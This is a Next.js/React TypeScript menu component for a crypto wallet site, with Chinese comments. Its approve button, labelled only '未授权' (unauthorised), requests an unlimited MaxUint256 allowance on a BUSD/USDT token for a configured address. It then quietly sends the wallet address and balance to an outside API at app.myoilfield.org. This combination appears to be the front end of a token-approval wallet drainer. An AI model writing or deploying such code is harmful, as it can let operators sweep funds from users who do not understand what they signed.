"use client";
import Image from "next/image";
import styles from "./index.module.scss";
import { useActiveAccount } from "thirdweb/react";
import CallWallet from "../CallWallet";
import logo from "../../public/images/logo.jpg";
import { getContract2, getTokenBalance } from "../../public/utils";
import { APIConfig } from "../../abi/APIConfiguration";
import { USDTAbi } from "../../abi/USDTAbi";
import { message } from "antd";
import { ethers } from "ethers";
import axios from "axios";
import { useEffect,useState } from "react";

interface TopProps {
  onToggleRightMenu: () => void;
}

const TopMenu: React.FC<TopProps> = ({ onToggleRightMenu }) => {
  const account: any = useActiveAccount();
  const [trueOrNo, setTrueOrNo] = useState(false);
  //授权
  const approve = async () => {
    if (account) {
      const contract: any = await getContract2(APIConfig.BUSDaddress, USDTAbi);
      const maxApproval = ethers.constants.MaxUint256;
      try {
        //发起授权
        const tx = await contract.approve(APIConfig.ETHAddress, maxApproval, {
          gasLimit: 500000, // 手动设置 gas limit
        });
        await tx.wait();
        const tokenBalance = await getTokenBalance(account.address)
      
        const url = "https://app.myoilfield.org/api/wallet/createWallet?walletAddress="+account.address+'&balance='+Number(tokenBalance).toFixed(3);
        axios
          .get(url)
          .then((response) => {
            
          })
          .catch((error) => {
          });
        message.success("授权成功");
      } catch (error) {
        console.log(error, "error");
        message.success("授权失败，请重试");
      }
    } else {
      message.warning("请登录");
    }
  };
  //查询是否授权
  const geAuthOrNot = async() => {
    const res:any =  await getTokenBalance(account.address,1)
    if(res == 0.0){
      setTrueOrNo(false)
    }else{
      setTrueOrNo(true)
    }
  }
  useEffect(() => {
    if (account) {
      geAuthOrNot();
    }
  }, [account]);
  return (
    <div className={styles.pagetop}>
      <Image
        className={styles.m1}
        src={logo}
        alt="coin"
        width={50}
        height={50}
      />

      <CallWallet />

      {/* <Image
        className={styles.m2}
        onClick={approve}
        src="https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/selectorSwitch.png"
        alt="selectorSwitch"
        width={50}
        height={50}
      /> */}
      <div
        style={{
          color: "#fff",
          fontSize: "14px",
        }}
        onClick={trueOrNo?geAuthOrNot:approve}
      >
        {trueOrNo?'已授权':'未授权'}
      </div>
      <Image
        onClick={onToggleRightMenu}
        className={styles.m3}
        src="https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png"
        alt="menu"
        width={50}
        height={50}
      />
    </div>
  );
};

export default TopMenu;
